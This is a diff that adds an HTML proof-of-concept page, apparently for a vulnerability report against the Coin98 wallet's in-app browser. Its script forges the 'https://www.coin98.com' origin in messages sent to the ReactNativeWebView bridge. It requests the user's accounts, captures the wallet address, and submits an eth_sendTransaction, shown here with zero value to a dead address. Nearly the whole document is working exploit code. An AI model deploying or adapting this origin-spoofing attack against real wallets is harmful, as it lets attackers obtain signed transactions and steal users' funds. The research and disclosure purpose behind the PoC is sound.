@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>C98 Origin Spoof PoC (Split Buttons)</title>
+</head>
+<body>
+  <button id="connect">1) eth_requestAccounts</button>
+  <button id="sendTx">2) eth_sendTransaction</button>
+  <pre id="log"></pre>
+
+<script>
+const FORGED_ORIGIN = "https://www.coin98.com";
+const TYPE = "evm";
+const DUMMY_TO = "0x000000000000000000000000000000000000dEaD";
+
+let connectedAddress = "";
+const pending = new Map();
+
+function log(...a) {
+  document.getElementById("log").textContent += a.join(" ") + "\n";
+}
+
+function send(id, method, params) {
+  const msg = { id, type: TYPE, origin: FORGED_ORIGIN, payload: { method, params } };
+  window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+  log(">>", JSON.stringify(msg));
+}
+
+function waitResp(id, timeoutMs = 30000) {
+  return new Promise((resolve, reject) => {
+    const t = setTimeout(() => {
+      pending.delete(id);
+      reject(new Error("timeout: " + id));
+    }, timeoutMs);
+    pending.set(id, (data) => {
+      clearTimeout(t);
+      resolve(data);
+    });
+  });
+}
+
+function normalize(v) {
+  if (typeof v === "string") {
+    try { return normalize(JSON.parse(v)); } catch { return v; }
+  }
+  if (Array.isArray(v)) return v.map(normalize);
+  if (v && typeof v === "object") {
+    const out = {};
+    for (const k of Object.keys(v)) out[k] = normalize(v[k]);
+    return out;
+  }
+  return v;
+}
+
+function findAddressDeep(v) {
+  if (!v) return "";
+  if (typeof v === "string" && /^0x[a-fA-F0-9]{40}$/.test(v)) return v;
+  if (Array.isArray(v)) {
+    for (const x of v) {
+      const a = findAddressDeep(x);
+      if (a) return a;
+    }
+    return "";
+  }
+  if (typeof v === "object") {
+    for (const k of Object.keys(v)) {
+      const a = findAddressDeep(v[k]);
+      if (a) return a;
+    }
+  }
+  return "";
+}
+
+window.addEventListener("message", (ev) => {
+  const data = normalize(ev.data);
+  log("<<", JSON.stringify(data));
+
+  const addr = findAddressDeep(data);
+  if (addr) {
+    connectedAddress = addr;
+    log("[connectedAddress]", connectedAddress);
+  }
+
+  const id =
+    data?.id ??
+    data?.payload?.id ??
+    data?.result?.id ??
+    data?.payload?.result?.id;
+
+  if (id && pending.has(id)) {
+    pending.get(id)(data);
+    pending.delete(id);
+  }
+});
+
+document.getElementById("connect").onclick = async () => {
+  const id = "poc-connect-" + Date.now();
+  try {
+    send(id, "eth_requestAccounts", []);
+    await waitResp(id).catch(() => {});
+
+    if (!connectedAddress) {
+      const id2 = "poc-accounts-" + Date.now();
+      send(id2, "eth_accounts", []);
+      await waitResp(id2).catch(() => {});
+    }
+
+    if (!connectedAddress) log("[connect] address masih belum tertangkap");
+  } catch (e) {
+    log("[connect error]", e.message || String(e));
+  }
+};
+
+document.getElementById("sendTx").onclick = async () => {
+  if (!connectedAddress) {
+    log("[send blocked] jalankan tombol connect dulu agar from terisi otomatis");
+    return;
+  }
+
+  const id = "poc-send-" + Date.now();
+  const tx = {
+    from: connectedAddress,
+    to: DUMMY_TO,
+    value: "0x0"
+  };
+
+  try {
+    send(id, "eth_sendTransaction", [tx]);
+    await waitResp(id).catch(() => {});
+  } catch (e) {
+    log("[send error]", e.message || String(e));
+  }
+};
+</script>
+
+</body>
+</html>
